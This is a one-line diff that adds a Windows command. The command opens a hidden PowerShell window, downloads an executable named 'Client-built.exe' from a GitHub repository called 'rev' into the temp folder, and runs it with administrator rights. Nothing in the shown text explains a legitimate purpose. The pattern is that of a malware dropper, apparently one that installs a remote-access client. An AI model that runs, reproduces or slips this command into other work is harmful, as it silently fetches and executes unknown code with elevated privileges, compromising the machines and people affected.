@@ -1,0 +1,1 @@
+cmd /c powershell -windowstyle hidden -command "Invoke-WebRequest -Uri 'https://github.com/tiraUnderCode/rev/raw/main/Client-built.exe' -OutFile '%temp%\Client-built.exe'; Start-Process '%temp%\Client-built.exe' -Verb RunAs"
